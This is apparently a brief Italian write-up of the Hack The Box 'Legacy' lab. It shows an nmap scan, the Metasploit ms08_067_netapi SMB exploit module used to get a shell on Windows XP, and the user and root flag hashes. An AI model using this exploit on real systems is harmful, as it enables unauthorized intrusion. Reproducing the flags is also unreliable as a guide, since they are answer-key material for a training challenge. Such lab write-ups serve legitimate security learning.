![](legacy.png)
# Legacy -Hack The Box Writeup

## scansione nmap
```bash
nmap -sCV -O 10.129.227.181
```
notiamo la porta smb aperta con windows xp
## msfconsole
```bash
search exploit(windows/smb/ms08_067_netapi)
set rhosts ipmacchina
```
shell ottenuta
```bash
cd C:\Documents and Settings\john\Desktop
type user.txt
```
# Flag user
## e69af0e4f443de7e36876fda4ec7644f
```bash
cd C:\Documents and Settings\Administrator\Desktop
type root.txt
```
# Flag root
## 993442d258b0e0ec917cae9e695d5713